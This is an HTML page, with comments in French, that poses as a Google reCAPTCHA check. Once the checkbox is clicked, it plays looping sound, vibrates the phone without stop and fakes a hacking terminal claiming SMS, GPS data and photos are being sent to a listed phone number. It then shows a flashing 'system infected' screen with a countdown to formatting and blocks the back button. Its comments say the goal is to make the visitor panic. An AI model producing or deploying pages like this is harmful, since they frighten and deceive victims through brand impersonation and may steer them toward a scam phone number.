<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Security Check</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 0; overflow: hidden; touch-action: none; }
        
        /* Captcha */
        #captcha-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; display: flex; flex-direction: column;
            justify-content: center; align-items: center; z-index: 1000;
        }
        .captcha-box { border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; display: flex; align-items: center; gap: 15px; background: #f9f9f9; }
        
        /* La case qui change de couleur */
        .checkbox { 
            width: 28px; height: 28px; border: 2px solid #c1c1c1; 
            border-radius: 2px; cursor: pointer; position: relative;
            background: white; transition: background 0.2s, border-color 0.2s;
        }
        .checkbox.checked {
            background: #4A90E2; /* Bleu Google */
            border-color: #4A90E2;
        }
        .checkbox.checked::after {
            content: '✔'; color: white; position: absolute;
            left: 5px; top: 0px; font-size: 20px;
        }

        /* Terminal */
        #terminal { display: none; padding: 15px; font-size: 12px; color: #0f0; height: 100vh; overflow: hidden; }

        /* Alerte Rouge */
        #alert-box {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; color: #f00; display: none;
            flex-direction: column; justify-content: center; align-items: center;
            text-align: center; z-index: 2000; animation: flash 0.2s infinite;
        }
        @keyframes flash { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
        .phone-red { background: yellow; color: #000; padding: 10px; font-size: 1.5rem; margin: 15px 0; }
    </style>
</head>
<body>

<div id="captcha-container">
    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
    <p style="color:#555; font-family: Arial;">Vérification de sécurité...</p>
    <div class="captcha-box" id="captcha-box" style="display:none;">
        <div class="checkbox" id="trigger"></div>
        <span style="font-size: 14px; color: #555; font-family: Arial;">Je ne suis pas un robot</span>
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
    </div>
</div>

<div id="terminal"></div>

<div id="alert-box">
    <h1>SYSTÈME INFECTÉ</h1>
    <p>TRANSFERT DES DONNÉES VERS :</p>
    <div class="phone-red">+243 819 679 859</div>
    <p>NE TENTEZ PAS DE FERMER CETTE PAGE</p>
    <h2 id="timer">FORMATAGE : 10s</h2>
</div>

<audio id="vibeSound" src="vibration.mp3" loop></audio>

<script>
    const trigger = document.getElementById('trigger');
    const captchaBox = document.getElementById('captcha-box');
    const vibeSound = document.getElementById('vibeSound');

    // Afficher le captcha après un faux chargement
    setTimeout(() => {
        document.querySelector('#captcha-container div').style.display = 'none';
        captchaBox.style.display = 'flex';
    }, 2000);

    trigger.addEventListener('click', () => {
        // 1. La case devient bleue (effet visuel "crédible")
        trigger.classList.add('checked');

        // 2. Activer le son et la vibration immédiatement
        vibeSound.volume = 1.0;
        vibeSound.play();
        
        // Vibration continue (on relance la vibration en boucle)
        if (navigator.vibrate) {
            setInterval(() => {
                navigator.vibrate(1000); 
            }, 1100);
        }

        // 3. Petit délai de 0.5s pour que la personne voie la case bleue, puis panique
        setTimeout(() => {
            document.getElementById('captcha-container').style.display = 'none';
            document.getElementById('terminal').style.display = 'block';
            startHackEffect();
        }, 600);
    });

    function startHackEffect() {
        const logs = ["ROOT ACCESS...", "DUMPING SMS...", "GPS TRACKING...", "UPLOADING PHOTOS...", "SENDING TO +243819679859"];
        let count = 0;
        const interval = setInterval(() => {
            document.getElementById('terminal').innerHTML += `> ${logs[Math.floor(Math.random()*logs.length)]}<br>`;
            window.scrollTo(0, document.body.scrollHeight);
            count++;
            if(count > 80) {
                clearInterval(interval);
                document.getElementById('terminal').style.display = 'none';
                document.getElementById('alert-box').style.display = 'flex';
                let t = 10;
                setInterval(() => { if(t>0) document.getElementById('timer').innerText = `FORMATAGE : ${--t}s`; }, 1000);
            }
        }, 40);
    }

    // Bloquer le retour
    history.pushState(null, null, location.href);
    window.onpopstate = () => history.go(1);
</script>

<style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
</body>
</html>
